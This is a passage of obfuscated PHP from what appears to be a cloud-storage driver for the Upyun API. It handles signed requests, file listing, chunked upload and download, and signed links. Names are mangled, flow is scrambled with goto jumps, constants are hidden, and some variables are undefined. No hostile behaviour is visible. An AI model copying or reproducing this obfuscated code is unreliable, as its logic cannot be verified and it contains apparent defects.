"\150\x74\164\160\x3a\x2f\57\x76\60\56\x61\x70\x69\x2e\165\x70\171\x75\156\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($a¤Ğ·‚Ÿî) { parent::__construct(); $this->_init($a¤Ğ·‚Ÿî); } public function _init($b‡›¶£Ãï) { foreach ($b‡›¶£Ãï as $føƒ£Æ†Õ => $b‰¨Àï»±‚) { if (isset($this->{$føƒ£Æ†Õ})) { $this->{$føƒ£Æ†Õ} = $b‰¨Àï»±‚; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[‚Ğ°–—î][1241], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($eáˆåà¯— , $A™ƒ¯Ã½Ø = "\107\x45\x54") { $CİÂõŠšµ =& $_SERVER[‚Ğ°–—î]; $bµê™ËæÂÁ = gmdate($CİÂõŠšµ[1205]); $eåÛ·Ùëˆğ = base64_encode(hash_hmac($CİÂõŠšµ[1242], "{$A™ƒ¯Ã½Ø}\x26{$eáˆåà¯— }\46{$bµê™ËæÂÁ}", md5("{$this->userpass}"), !0)); $dÖêÒø© = array("\x41\x75\x74\150\x6f\162\x69\172\141\164\151\157\156\72\x55\x50\131\x55\116\40{$this->username}\x3a{$eåÛ·Ùëˆğ}", "\x44\141\164\145\72{$bµê™ËæÂÁ}"); return $dÖêÒø©; } public function ussRequest($aĞïĞ¶Ğ×, $e§¦Åºé î = "\x47\x45\x54", $DæïÍÛ†õó = false, $c¯øÉÀÕ = false, $a÷á•££ë = false) { goto cÓæ¢—¡Á‡; cÓæ¢—¡Á‡: $A³­‰„ÈÌ =& $_SERVER[‚Ğ°–—î]; $aĞïĞ¶Ğ× = trim($aĞïĞ¶Ğ×, $A³­‰„ÈÌ[8]); $EÎ›¾•îçù = "\x2f{$this->bucket}\x2f{$aĞïĞ¶Ğ×}"; goto f¼›‹ÚÀéÒ; f¼›‹ÚÀéÒ: $a—Û¥ˆÀô = $this->ussHeaders($EÎ›¾•îçù, $e§¦Åºé î); if ($c¯øÉÀÕ) { $a—Û¥ˆÀô = array_merge($a—Û¥ˆÀô, $c¯øÉÀÕ); } $EÑˆÄîÎëÒ = url_request($this->endpoint . $EÎ›¾•îçù, $e§¦Åºé î, $DæïÍÛ†õó, $a—Û¥ˆÀô, $a÷á•££ë); goto D”‡åôİº‹; D”‡åôİº‹: if (!$EÑˆÄîÎëÒ) { return array($A³­‰„ÈÌ[1033] => !1, $A³­‰„ÈÌ[1035] => $A³­‰„ÈÌ[1243]); } if (strtolower($e§¦Åºé î) == $A³­‰„ÈÌ[184] || in_array($EÑˆÄîÎëÒ[$A³­‰„ÈÌ[1033]], array($A³­‰„ÈÌ[1101], $A³­‰„ÈÌ[1244]))) { $DæïÍÛ†õó = $EÑˆÄîÎëÒ[$A³­‰„ÈÌ[1245]]; } else { $DæïÍÛ†õó = json_decode($EÑˆÄîÎëÒ[$A³­‰„ÈÌ[1035]], !0); if (!$DæïÍÛ†õó) { $DæïÍÛ†õó = $EÑˆÄîÎëÒ[$A³­‰„ÈÌ[1035]]; } else { if (!$EÑˆÄîÎëÒ[$A³­‰„ÈÌ[688]] && isset($DæïÍÛ†õó[$A³­‰„ÈÌ[1246]])) { $DæïÍÛ†õó = $DæïÍÛ†õó[$A³­‰„ÈÌ[1246]]; } } } return array($A³­‰„ÈÌ[1033] => $EÑˆÄîÎëÒ[$A³­‰„ÈÌ[688]], $A³­‰„ÈÌ[1035] => $DæïÍÛ†õó); goto dØ¾îØ´Š; dØ¾îØ´Š: } public function mkfile($Eô§øÈ–´Ó, $D‘Í¨ÈÜŒ§ = '', $BÑãğğÉøŸ = REPEAT_RENAME) { if ($this->setContent($Eô§øÈ–´Ó, $D‘Í¨ÈÜŒ§)) { return $this->getPathOuter($Eô§øÈ–´Ó); } return !1; } public function mkdir($b™ŸŸè —, $eƒµ‡¦”¶ = REPEAT_SKIP) { $cˆÁ±Ï¿Á’ =& $_SERVER[‚Ğ°–—î]; $fŠ‘ÇåäÊ· = trim($b™ŸŸè —, $cˆÁ±Ï¿Á’[8]); if ($this->_isFolder($fŠ‘ÇåäÊ·)) { return $this->getPathOuter($fŠ‘ÇåäÊ·); } $FÃòåÍŸ«± = array($cˆÁ±Ï¿Á’[1247]); $aÅÙ‰“¶ğ = $this->ussRequest($fŠ‘ÇåäÊ·, $cˆÁ±Ï¿Á’[212], !1, $FÃòåÍŸ«±); return $aÅÙ‰“¶ğ[$cˆÁ±Ï¿Á’[1033]] ? $this->getPathOuter($fŠ‘ÇåäÊ·) : !1; } public function copyFile($C†ìÀ¢Å­Â, $c£‡Òç¯ÅÚ) { $CõéÎ„Ò•‹ =& $_SERVER[‚Ğ°–—î]; $c³çÛ¤á› = array($CõéÎ„Ò•‹[1248] . "\57{$this->bucket}\57{$C†ìÀ¢Å­Â}", $CõéÎ„Ò•‹[1249]); $dÀàßÚéõÏ = $this->ussRequest($c£‡Òç¯ÅÚ, $CõéÎ„Ò•‹[214], !1, $c³çÛ¤á›); return $dÀàßÚéõÏ[$CõéÎ„Ò•‹[1033]] ? !0 : !1; } public function moveFile($DÑø•Ÿ‡, $BŠÚ§Ôó×Î) { $aƒä…À· =& $_SERVER[‚Ğ°–—î]; $BÓÍ¤”–°Î = array($aƒä…À·[1250] . "\57{$this->bucket}\x2f{$DÑø•Ÿ‡}", $aƒä…À·[1249]); $F±ó¸˜–ß = $this->ussRequest($BŠÚ§Ôó×Î, $aƒä…À·[214], !1, $BÓÍ¤”–°Î); return $F±ó¸˜–ß[$aƒä…À·[1033]] ? !0 : !1; } public function delFile($Bç¸ÁÚŠßº) { $FŒ‰·‡‚ñ„ =& $_SERVER[‚Ğ°–—î]; $FÄäÑ°Ìœô = $this->ussRequest($Bç¸ÁÚŠßº, $FŒ‰·‡‚ñ„[1251]); return $FÄäÑ°Ìœô[$FŒ‰·‡‚ñ„[1033]] ? !0 : !1; } public function delFolder($b’Û‰ºÃÀà) { $B¡£ëÌ¶Ä =& $_SERVER[‚Ğ°–—î]; $f½•ñ‹Ú®µ = $this->listAll($b’Û‰ºÃÀà); krsort($f½•ñ‹Ú®µ); foreach ($f½•ñ‹Ú®µ as $dè‹ğ®«ÛÉ) { $this->ussRequest($dè‹ğ®«ÛÉ[$B¡£ëÌ¶Ä[75]], $B¡£ëÌ¶Ä[1251]); } return $this->ussRequest($b’Û‰ºÃÀà, $B¡£ëÌ¶Ä[1251]); } public function rename($CñÏÎ¥ó¡…, $FÁ²”‡º©“) { if ($this->isFile($CñÏÎ¥ó¡…)) { $FÁ²”‡º©“ = get_path_father($CñÏÎ¥ó¡…) . $FÁ²”‡º©“; return $this->moveFile($CñÏÎ¥ó¡…, $FÁ²”‡º©“); } return $this->renameObject($CñÏÎ¥ó¡…, $FÁ²”‡º©“); } public function fileInfo($B™éñ¸äã, $EŒµîé·¡Ë = false, $D×ŸßÍ‰ÙÖ = array()) { $c„êäã¢ñ£ =& $_SERVER[‚Ğ°–—î]; if ($EŒµîé·¡Ë) { return array($c„êäã¢ñ£[28] => $this->pathThis($B™éñ¸äã), $c„êäã¢ñ£[75] => $this->getPathOuter($c„êäã¢ñ£[8] . $B™éñ¸äã), $c„êäã¢ñ£[29] => $c„êäã¢ñ£[167], $c„êäã¢ñ£[77] => isset($D×ŸßÍ‰ÙÖ[$c„êäã¢ñ£[325]]) ? $D×ŸßÍ‰ÙÖ[$c„êäã¢ñ£[325]] : 0, $c„êäã¢ñ£[160] => $this->ext($B™éñ¸äã)); } $a¹·¸Æğò = array($c„êäã¢ñ£[28] => $this->pathThis($B™éñ¸äã), $c„êäã¢ñ£[75] => $this->getPathOuter($c„êäã¢ñ£[8] . $B™éñ¸äã), $c„êäã¢ñ£[29] => $c„êäã¢ñ£[167], $c„êäã¢ñ£[187] => 0, $c„êäã¢ñ£[107] => isset($eÊŠØÙ•é[$c„êäã¢ñ£[1252]]) ? $eÊŠØÙ•é[$c„êäã¢ñ£[1252]] : 0, $c„êäã¢ñ£[77] => isset($D×ŸßÍ‰ÙÖ[$c„êäã¢ñ£[325]]) ? $D×ŸßÍ‰ÙÖ[$c„êäã¢ñ£[325]] : 0, $c„êäã¢ñ£[160] => $this->ext($B™éñ¸äã), $c„êäã¢ñ£[188] => !0, $c„êäã¢ñ£[189] => !0); if (empty($D×ŸßÍ‰ÙÖ)) { $D×ŸßÍ‰ÙÖ = $this->objectMeta($B™éñ¸äã); if (!$D×ŸßÍ‰ÙÖ) { return $a¹·¸Æğò; } $a¹·¸Æğò[$c„êäã¢ñ£[187]] = $D×ŸßÍ‰ÙÖ[$c„êäã¢ñ£[1253]]; $a¹·¸Æğò[$c„êäã¢ñ£[107]] = $D×ŸßÍ‰ÙÖ[$c„êäã¢ñ£[1254]]; $a¹·¸Æğò[$c„êäã¢ñ£[77]] = $D×ŸßÍ‰ÙÖ[$c„êäã¢ñ£[77]]; } return $a¹·¸Æğò; } public function folderInfo($CÀ«õ•¨­è, $bİ¹‚Åê» = false) { $c§¼ƒ³Çµ³ =& $_SERVER[‚Ğ°–—î]; if ($bİ¹‚Åê») { return array($c§¼ƒ³Çµ³[28] => $this->pathThis($CÀ«õ•¨­è), $c§¼ƒ³Çµ³[75] => $this->getPathOuter($c§¼ƒ³Çµ³[8] . $CÀ«õ•¨­è), $c§¼ƒ³Çµ³[29] => $c§¼ƒ³Çµ³[76]); } $aÆ”Ãæ‘£á = array($c§¼ƒ³Çµ³[28] => $this->pathThis($CÀ«õ•¨­è), $c§¼ƒ³Çµ³[75] => $this->getPathOuter($c§¼ƒ³Çµ³[8] . $CÀ«õ•¨­è), $c§¼ƒ³Çµ³[29] => $c§¼ƒ³Çµ³[76], $c§¼ƒ³Çµ³[187] => 0, $c§¼ƒ³Çµ³[107] => isset($AŞ³«ˆ[$c§¼ƒ³Çµ³[1252]]) ? $AŞ³«ˆ[$c§¼ƒ³Çµ³[1252]] : 0, $c§¼ƒ³Çµ³[1162] => !0, $c§¼ƒ³Çµ³[1163] => !0); if (empty($d„±È†óô)) { $d„±È†óô = $this->objectMeta($CÀ«õ•¨­è); if (!$d„±È†óô) { return $aÆ”Ãæ‘£á; } $aÆ”Ãæ‘£á[$c§¼ƒ³Çµ³[187]] = $d„±È†óô[$c§¼ƒ³Çµ³[1253]]; $aÆ”Ãæ‘£á[$c§¼ƒ³Çµ³[107]] = $d„±È†óô[$c§¼ƒ³Çµ³[1254]]; } return $aÆ”Ãæ‘£á; } private function fileList($EÚ™ÜÆ…ø, $cçöëÂ«ô‰ = 0, $b¶áï¡£• = 1000) { $Fíò™›÷íæ =& $_SERVER[‚Ğ°–—î]; $aŸƒ« ¤á = array($Fíò™›÷íæ[1255], $Fíò™›÷íæ[1256] . $b¶áï¡£•); if ($cçöëÂ«ô‰) { $aŸƒ« ¤á[] = $Fíò™›÷íæ[1257] . $cçöëÂ«ô‰; } $E¾ÒƒÛ¸øß = $this->ussRequest($EÚ™ÜÆ…ø, $Fíò™›÷íæ[216], !1, $aŸƒ« ¤á); return !$E¾ÒƒÛ¸øß[$Fíò™›÷íæ[1033]] ? !1 : $E¾ÒƒÛ¸øß[$Fíò™›÷íæ[1035]]; } public function listPath($aëÑ÷†äé°, $C³®‰Çç˜‡ = false) { goto f˜‡ºóƒ‹; cÎò®¸ÑÖĞ: $d¼ÌìÂá‰¿ = $B¾¾š ñé• = array(); $D±ö™–£è¶ = rtrim($aëÑ÷†äé°, $DÍ”’ß’â[8]) . $DÍ”’ß’â[8]; while (!0) { $b§Ê›ôö®Ë = $this->fileList($aëÑ÷†äé°, $fŒâ™ù‰Å, $E¤Ç…‡ù¦¿); if (!$b§Ê›ôö®Ë) { return !1; } $fŒâ™ù‰Å = isset($b§Ê›ôö®Ë[$DÍ”’ß’â[1258]]) ? $b§Ê›ôö®Ë[$DÍ”’ß’â[1258]] : $DÍ”’ß’â[33]; $F°”«­×Š¬ = isset($b§Ê›ôö®Ë[$DÍ”’ß’â[1259]]) ? $b§Ê›ôö®Ë[$DÍ”’ß’â[1259]] : array(); foreach ($F°”«­×Š¬ as $Ağ¤¤¡ßØ) { if ($Ağ¤¤¡ßØ[$DÍ”’ß’â[29]] == $DÍ”’ß’â[76]) { $d¼ÌìÂá‰¿[] = $this->folderInfo($D±ö™–£è¶ . $Ağ¤¤¡ßØ[$DÍ”’ß’â[28]], $C³®‰Çç˜‡, $Ağ¤¤¡ßØ); } else { $B¾¾š ñé•[] = $this->fileInfo($D±ö™–£è¶ . $Ağ¤¤¡ßØ[$DÍ”’ß’â[28]], $C³®‰Çç˜‡, $Ağ¤¤¡ßØ); } } if (count($F°”«­×Š¬) < $E¤Ç…‡ù¦¿) { break; } } goto C´ó‡ŒëñŒ; C´ó‡ŒëñŒ: return array($DÍ”’ß’â[74] => $d¼ÌìÂá‰¿, $DÍ”’ß’â[73] => $B¾¾š ñé•); goto cÓ”¡‰À…; f˜‡ºóƒ‹: $DÍ”’ß’â =& $_SERVER[‚Ğ°–—î]; $fŒâ™ù‰Å = $DÍ”’ß’â[33]; $E¤Ç…‡ù¦¿ = 1000; goto cÎò®¸ÑÖĞ; cÓ”¡‰À…: } private function recursionAllFiles($BŞöàÀêÃ‚, &$c µâ„¯ò¢) { $A—»Áš–İ =& $_SERVER[‚Ğ°–—î]; $D’ˆó‹ó· = $A—»Áš–İ[33]; $CëÂ×•ö–‚ = 1000; $E¶‰¼òÙ»ä = $f—‹¢Úµ§ò = array(); $BÁÌ‚¸×Ó = rtrim($BŞöàÀêÃ‚, $A—»Áš–İ[8]) . $A—»Áš–İ[8]; while (!0) { $E¹÷ä‘ë‹· = $this->fileList($BŞöàÀêÃ‚, $D’ˆó‹ó·, $CëÂ×•ö–‚); if (!$E¹÷ä‘ë‹·) { return !1; } $D’ˆó‹ó· = isset($E¹÷ä‘ë‹·[$A—»Áš–İ[1258]]) ? $E¹÷ä‘ë‹·[$A—»Áš–İ[1258]] : $A—»Áš–İ[33]; $DÃË‹½±ªÇ = isset($E¹÷ä‘ë‹·[$A—»Áš–İ[1259]]) ? $E¹÷ä‘ë‹·[$A—»Áš–İ[1259]] : array(); foreach ($DÃË‹½±ªÇ as $EÒ™óâ³ì) { $aŒööóòŸ‡ = array($A—»Áš–İ[75] => $BÁÌ‚¸×Ó . $EÒ™óâ³ì[$A—»Áš–İ[28]], $A—»Áš–İ[76] => $EÒ™óâ³ì[$A—»Áš–İ[29]] == $A—»Áš–İ[76] ? 1 : 0, $A—»Áš–İ[77] => isset($EÒ™óâ³ì[$A—»Áš–İ[325]]) ? $EÒ™óâ³ì[$A—»Áš–İ[325]] : 0); $c µâ„¯ò¢[] = $aŒööóòŸ‡; if ($aŒööóòŸ‡[$A—»Áš–İ[76]] == 1) { $this->recursionAllFiles($aŒööóòŸ‡[$A—»Áš–İ[75]], $c µâ„¯ò¢); } } if (count($DÃË‹½±ªÇ) < $CëÂ×•ö–‚) { break; } } } public function has($e¹¦…¥Š‚ø, $e²æìªå‰Ô = false, $Báæ¤“½ØÀ = true) { goto CêËî¡Ò‚‡; CêËî¡Ò‚‡: $AŠôƒ¢Âğ… =& $_SERVER[‚Ğ°–—î]; $CÍÏ×¬î· = $AŠôƒ¢Âğ…[33]; $AÑçç¿°ß = 1000; goto F®§³æ˜ó¤; eÏ¬îîõ¾: while (!0) { $F„‡öğÍÁ = $this->fileList($e¹¦…¥Š‚ø, $CÍÏ×¬î·, $AÑçç¿°ß); if (!$F„‡öğÍÁ) { return !1; } $CÍÏ×¬î· = isset($F„‡öğÍÁ[$AŠôƒ¢Âğ…[1258]]) ? $F„‡öğÍÁ[$AŠôƒ¢Âğ…[1258]] : $AŠôƒ¢Âğ…[33]; $c³öÂóĞ³š = isset($F„‡öğÍÁ[$AŠôƒ¢Âğ…[1259]]) ? $F„‡öğÍÁ[$AŠôƒ¢Âğ…[1259]] : array(); if (empty($c³öÂóĞ³š)) { break; } $fÉŒ¾À«¦— = array_to_keyvalue($c³öÂóĞ³š, $AŠôƒ¢Âğ…[33], $AŠôƒ¢Âğ…[29]); $fÁ‚ÄÈ”Ã = array_count_values($fÉŒ¾À«¦—); $E‰¥²µ¡Ô = isset($fÁ‚ÄÈ”Ã[$AŠôƒ¢Âğ…[76]]) ? $fÁ‚ÄÈ”Ã[$AŠôƒ¢Âğ…[76]] : 0; $dŠ¾Ğ•ˆ¡¤ = count($fÉŒ¾À«¦—) - $E‰¥²µ¡Ô; if ($e²æìªå‰Ô) { $eâ†ÔÛƒ˜¨ += $E‰¥²µ¡Ô; $EƒõÜƒÓ³• += $dŠ¾Ğ•ˆ¡¤; if ($CŞäˆÊ¹¤“ < $AÑçç¿°ß) { break; } continue; } if ($Báæ¤“½ØÀ) { if ($dŠ¾Ğ•ˆ¡¤) { return !0; } } else { if ($E‰¥²µ¡Ô) { return !0; } } if (count($c³öÂóĞ³š) < $AÑçç¿°ß) { break; } } if ($e²æìªå‰Ô) { return array($AŠôƒ¢Âğ…[191] => $EƒõÜƒÓ³•, $AŠôƒ¢Âğ…[192] => $eâ†ÔÛƒ˜¨); } return !1; goto EÈÖ“ªÃÅâ; F®§³æ˜ó¤: $EƒõÜƒÓ³• = 0; $eâ†ÔÛƒ˜¨ = 0; $b±ÆÄ¾ã°¶ = rtrim($e¹¦…¥Š‚ø, $AŠôƒ¢Âğ…[8]) . $AŠôƒ¢Âğ…[8]; goto eÏ¬îîõ¾; EÈÖ“ªÃÅâ: } public function listAll($b¸‡¾Ñ‚Ğ¶) { $Dàà—¦©ßÙ = array(); $this->recursionAllFiles($b¸‡¾Ñ‚Ğ¶, $Dàà—¦©ßÙ); return $Dàà—¦©ßÙ; } public function canRead($eŒšœ²ó) { return $this->exist($eŒšœ²ó) ? !0 : !1; } public function canWrite($C‰ŞÛÈ«Ù£) { return $this->exist($C‰ŞÛÈ«Ù£) ? !0 : !1; } public function getContent($aÂŒ‘£Ê´¦) { return $this->fileSubstr($aÂŒ‘£Ê´¦, 0, -1); } public function setContent($B‡ÖÎÆºÕ‡, $CÅ—·ˆÔ“ = '') { $f••ì¤ì÷º =& $_SERVER[‚Ğ°–—î]; if (!$CÅ—·ˆÔ“) { $cÆµÔø¡İ = $this->ussRequest($B‡ÖÎÆºÕ‡, $f••ì¤ì÷º[212]); return $cÆµÔø¡İ[$f••ì¤ì÷º[1033]]; } $FÉ©åóª¬ = $this->tempFile($this->pathThis($B‡ÖÎÆºÕ‡)); file_put_contents($FÉ©åóª¬, $CÅ—·ˆÔ“); if ($this->upload($B‡ÖÎÆºÕ‡, $FÉ©åóª¬)) { $this->tempFileRemve($FÉ©åóª¬); return !0; } return !1; } public function fileSubstr($d·ìÆ‹–İ®, $fŸ¼ª¤„ã±, $f¨…ò¿÷­) { $bßÆÅø =& $_SERVER[‚Ğ°–—î]; if (!($Døİ˜Ù¯âÂ = $this->link($d·ìÆ‹–İ®))) { return !1; } $b’ÎƒéÇ¸Ê = !1; if ($f¨…ò¿÷­ > 0) { $DÔÌˆÄ‚£° = $fŸ¼ª¤„ã± + $f¨…ò¿÷­ - 1; $b’ÎƒéÇ¸Ê = array($bßÆÅø[1220] . $fŸ¼ª¤„ã± . $bßÆÅø[412] . $DÔÌˆÄ‚£°); } $FˆĞ±ÆÁÉĞ = url_request($Døİ˜Ù¯âÂ, $bßÆÅø[216], !1, $b’ÎƒéÇ¸Ê); return $FˆĞ±ÆÁÉĞ[$bßÆÅø[688]] ? $FˆĞ±ÆÁÉĞ[$bßÆÅø[1035]] : !1; } public function upload($EÎÚÅ»¸¢, $DÉöĞ†˜Ñ¡, $e«Ì±ƒ¢ˆ’ = false, $c†ŞœÕÏô = REPEAT_REPLACE) { goto fîŸ™øŠ£; b·¢èÑÖ©: do { $eÚåª§ºˆ¾ = $Cá¼ÕÆï§[$F×ŠÁ¡‚³–[1266]]; fseek($dÑ‹ŠËÓ˜¹, $f‡¡…á½Õ¹); $cÀ´‘ ñ‡Š = fread($dÑ‹ŠËÓ˜¹, $eÚåª§ºˆ¾); $CèˆÁ ƒ»¢ = 0; do { $CèˆÁ ƒ»¢++; $Cá¼ÕÆï§ = $this->uploadPart($EÎÚÅ»¸¢, $Cá¼ÕÆï§, $cÀ´‘ ñ‡Š); } while (!$Cá¼ÕÆï§ && $CèˆÁ ƒ»¢ < 3); if (!$Cá¼ÕÆï§) { return !1; } $CÃ®‰õ–Ô = $Cá¼ÕÆï§[$F×ŠÁ¡‚³–[1265]]; $f‡¡…á½Õ¹ += $eÚåª§ºˆ¾; } while ($CÃ®‰õ–Ô != -1); fclose($dÑ‹ŠËÓ˜¹); $b¿Â’£›ñĞ = array($F×ŠÁ¡‚³–[1267], $F×ŠÁ¡‚³–[1268] . $Cá¼ÕÆï§[$F×ŠÁ¡‚³–[1269]], $F×ŠÁ¡‚³–[1263]); goto bÉ ƒöÇÈ¨; bÉ ƒöÇÈ¨: $E±ŒÈï’Œø = $this->ussRequest($EÎÚÅ»¸¢, $F×ŠÁ¡‚³–[214], !1, $b¿Â’£›ñĞ); return $E±ŒÈï’Œø[$F×ŠÁ¡‚³–[1033]] ? $this->getPathOuter($b•ì» †) : !1; goto CäâñÍÓ¼Ö; F¬ö‹ÏÆĞ‹: $F…ğ¯¤í‚¾ = 1024 * 1024 * 10; $b¿Â’£›ñĞ = array($F×ŠÁ¡‚³–[1261], $F×ŠÁ¡‚³–[1262] . $fÁ–ºŸ†‰õ, $F×ŠÁ¡‚³–[1263], $F×ŠÁ¡‚³–[1264] . $F…ğ¯¤í‚¾); $E±ŒÈï’Œø = $this->ussRequest($EÎÚÅ»¸¢, $F×ŠÁ¡‚³–[214], !1, $b¿Â’£›ñĞ); goto A–‚ä¾…°õ; A–‚ä¾…°õ: if (!$E±ŒÈï’Œø[$F×ŠÁ¡‚³–[1033]]) { return !1; } $Cá¼ÕÆï§ = $E±ŒÈï’Œø[$F×ŠÁ¡‚³–[1035]]; $f‡¡…á½Õ¹ = 0; goto C®Êñôõæï; fîŸ™øŠ£: $F×ŠÁ¡‚³– =& $_SERVER[‚Ğ°–—î]; $fÁ–ºŸ†‰õ = IO::size($DÉöĞ†˜Ñ¡); if ($fÁ–ºŸ†‰õ <= 1024 * 1024 * 200) { $fçÎ”Â†¾ = array($F×ŠÁ¡‚³–[1260] . $DÉöĞ†˜Ñ¡); $E±ŒÈï’Œø = $this->ussRequest($EÎÚÅ»¸¢, $F×ŠÁ¡‚³–[214], $fçÎ”Â†¾); return $E±ŒÈï’Œø[$F×ŠÁ¡‚³–[1033]] ? $this->getPathOuter($EÎÚÅ»¸¢) : !1; } goto F¬ö‹ÏÆĞ‹; C®Êñôõæï: $CÃ®‰õ–Ô = $Cá¼ÕÆï§[$F×ŠÁ¡‚³–[1265]]; $dÑ‹ŠËÓ˜¹ = fopen($DÉöĞ†˜Ñ¡, $F×ŠÁ¡‚³–[1170]); if (!$dÑ‹ŠËÓ˜¹) { return !1; } goto b·¢èÑÖ©; CäâñÍÓ¼Ö: } private function uploadPart($EÔ‹ÅóçÒô, $c§Ø„’‚ÒÃ, &$b¾Æ©Œà‡±) { $DÆ˜ŞİÌò =& $_SERVER[‚Ğ°–—î]; $bÖÉõô«±¤ = array($DÆ˜ŞİÌò[1270], $DÆ˜ŞİÌò[1268] . $c§Ø„’‚ÒÃ[$DÆ˜ŞİÌò[1269]], $DÆ˜ŞİÌò[1271] . $c§Ø„’‚ÒÃ[$DÆ˜ŞİÌò[1265]], $DÆ˜ŞİÌò[138] . $c§Ø„’‚ÒÃ[$DÆ˜ŞİÌò[1266]]); $EœÑ‘ó¯¾Ò = $this->ussRequest($EÔ‹ÅóçÒô, $DÆ˜ŞİÌò[214], $b¾Æ©Œà‡±, $bÖÉõô«±¤); return !$EœÑ‘ó¯¾Ò[$DÆ˜ŞİÌò[1033]] ? $EœÑ‘ó¯¾Ò[$DÆ˜ŞİÌò[1033]] : $EœÑ‘ó¯¾Ò[$DÆ˜ŞİÌò[1035]]; } public function uploadFormData($Bê¥ñè÷‡Ó, $c“òâùçáš = 3600) { return $this->uploadPolicy($Bê¥ñè÷‡Ó, $c“òâùçáš); } public function multiUploadFormData($Dªø‰¹º…, $Dƒ®£´¬ğè = 3600) { $FäŸ†ğé³ =& $_SERVER[‚Ğ°–—î]; $d¿‰«óŸÏí = (int) $GLOBALS[$FäŸ†ğé³[7]][$FäŸ†ğé³[77]]; return $this->uploadPolicy($Dªø‰¹º…, $Dƒ®£´¬ğè, $d¿‰«óŸÏí); } private function uploadPolicy($AßÏµª«òÇ, $FÒÓêÉŞ» = 3600, $Fî°›™¶á = 0) { goto D¼¾ß¬ÁÊ¿; D†×³éĞÎ: $fÃŠÉ·°¥Ø = base64_encode(hash_hmac($EÍæÓÕÈƒ[1242], "\120\x4f\x53\x54\46{$e¸¹³î’ìã}\46{$A•¿Ì¡‡î«}\46{$BêµŠ‹Š£±}", md5("{$this->userpass}"), !0)); $e°†»Öó¡ = array($EÍæÓÕÈƒ[1113] => $BêµŠ‹Š£±, $EÍæÓÕÈƒ[1276] => "\x55\x50\x59\x55\116\40{$this->username}\x3a{$fÃŠÉ·°¥Ø}", $EÍæÓÕÈƒ[169] => $this->endpoint . $e¸¹³î’ìã); return $e°†»Öó¡; goto d£¤÷¥¯¯·; D¨ƒ„§ê¹‚: $CØõ“ë•÷— = array($EÍæÓÕÈƒ[1272] => $this->bucket, $EÍæÓÕÈƒ[1273] => $AßÏµª«òÇ, $EÍæÓÕÈƒ[1274] => time() + $FÒÓêÉŞ», $EÍæÓÕÈƒ[1275] => $A•¿Ì¡‡î«); if ($Fî°›™¶á) { $CØõ“ë•÷—[$EÍæÓÕÈƒ[1191]] = $Fî°›™¶á; } $BêµŠ‹Š£± = base64_encode(json_encode($CØõ“ë•÷—)); goto D†×³éĞÎ; D¼¾ß¬ÁÊ¿: $EÍæÓÕÈƒ =& $_SERVER[‚Ğ°–—î]; $e¸¹³î’ìã = $EÍæÓÕÈƒ[8] . $this->bucket; $A•¿Ì¡‡î« = gmdate($EÍæÓÕÈƒ[1205]); goto D¨ƒ„§ê¹‚; d£¤÷¥¯¯·: } public function download($FŞ—¦©ßòŠ, $aŒå¤Â‡Àö) { goto F÷Ú×¾õ¶; F÷Ú×¾õ¶: $F›î¢ò¼ôß = IO::getPathInner(IO::mkfile($aŒå¤Â‡Àö)); if (!($bá®…ÊØ¿Ö = $this->link($FŞ—¦©ßòŠ))) { return !1; } $CÔîŒÁ®µÁ = 0; goto b¥çØ¦È‘; b¥çØ¦È‘: $díĞö˜¸ŠË = 1024 * 200; $FƒÖÀĞ…„ô = fopen($F›î¢ò¼ôß, $_SERVER[‚Ğ°–—î][1226]); while (!0) { $CÇ†ÑÂ¸‘Š = $this->fileSubstr($FŞ—¦©ßòŠ, $CÔîŒÁ®µÁ, $díĞö˜¸ŠË); if ($CÇ†ÑÂ¸‘Š === !1) { return !1; } fwrite($FƒÖÀĞ…„ô, $CÇ†ÑÂ¸‘Š); $CÔîŒÁ®µÁ += $díĞö˜¸ŠË; if (strlen($CÇ†ÑÂ¸‘Š) < $díĞö˜¸ŠË) { break; } } goto FË³ô±™•; FË³ô±™•: fclose($FƒÖÀĞ…„ô); return $aŒå¤Â‡Àö; goto c‹Ù”Ì¥Â; c‹Ù”Ì¥Â: } public function link($EĞÌÒ¶, $cÊºåÖ¤« = array()) { $dƒô¹½òÈ× =& $_SERVER[‚Ğ°–—î]; $EĞÌÒ¶ = trim($EĞÌÒ¶, $dƒô¹½òÈ×[8]); if (!empty($this->token)) { $BÀÑäõ¾ÓÚ = strtotime(date($dƒô¹½òÈ×[1277])); $AÕø³õÔÂÓ = substr(md5($this->token . $dƒô¹½òÈ×[272] . $BÀÑäõ¾ÓÚ . $dƒô¹½òÈ×[1278] . $EĞÌÒ¶), 12, 8) . $BÀÑäõ¾ÓÚ; $cÊºåÖ¤«[] = $dƒô¹½òÈ×[1279] . $AÕø³õÔÂÓ; } $eŸ“¶µ¢¢™ = !empty($cÊºåÖ¤«) ? $dƒô¹½òÈ×[69] . implode($dƒô¹½òÈ×[272], $cÊºåÖ¤«) : $dƒô¹½òÈ×[33]; return $this->getHost() . $dƒô¹½òÈ×[8] . $EĞÌÒ¶ . $eŸ“¶µ¢¢™; } public function fileOut($e¯¿Ñé½‰, $D­ö®ç£õø = false, $DÊÕÌ‘îç = false, $Dá¶…¸¡Ó = '') { if (!$DÊÕÌ‘îç) { $DÊÕÌ‘îç = $this->pathThis($e¯¿Ñé½‰); } $E±­ãø¡‘ = $D­ö®ç£õø ? array($_SERVER[‚Ğ°–—î][1280] . rawurlencode($DÊÕÌ‘îç)) : array(); $Fã‹Á§Ï­ = $this->link($e¯¿Ñé½‰, $E±­ãø¡‘); $this->fileOutLink($Fã‹Á§Ï­); } public function fileOutServer($BÕÔç¤…õÕ, $F¡ÔÒ¤Ú„³ = false, $E¨Š…Æàä = false, $c“ŞÌˆ™ŠÛ = '') { parent::fileOut($BÕÔç¤…õÕ, $F¡ÔÒ¤Ú„³, $E¨Š…Æàä, $c“ŞÌˆ™ŠÛ); } public function fileOutImage($C†î—æ„¦, $cÍ˜¢ÊÀæ° = 250) { $D»§éõ¼Â = $this->link($C†î—æ„¦ . $_SERVER[‚Ğ°–—î][1281] . $cÍ˜¢ÊÀæ°); $this->fileOutLink($D»§éõ¼Â); } public function fileOutImageServer($fÈ­Â˜ñ”ß, $CŸ°©ÊË™ò = 250) { parent::fileOutImage($fÈ­Â˜ñ”ß, $CŸ°©ÊË™ò); } public function hashMd5($A»†…Â›¾) { $C»ø¶Õ¢Ü± =& $_SERVER[‚Ğ°–—î]; $fï¼‘œ©Œ„ = $this->objectMeta($A»†…Â›¾); return 